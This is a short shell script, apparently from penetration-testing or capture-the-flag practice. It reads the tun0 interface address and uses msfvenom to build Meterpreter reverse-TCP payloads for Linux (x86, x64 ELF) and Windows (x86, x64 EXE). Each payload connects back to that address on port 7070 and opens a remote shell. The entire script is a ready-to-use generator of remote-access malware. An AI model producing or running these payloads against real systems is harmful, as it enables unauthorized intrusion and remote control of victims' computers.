#check IP
export IPADDR=`ip -brief address show tun0 | awk '{print $3}' | awk -F/ '{print $1}'`

echo "IPADDR = $IPADDR"

#generate payloads with IP
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f elf > linux_86_meterpeter_reverse_tcp.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f elf > linux_64_meterpeter_reverse_tcp.elf

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=7070 -f exe > windows_86_meterpeter_reverse_tcp.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f exe > windows_64_meterpeter_reverse_tcp.exe
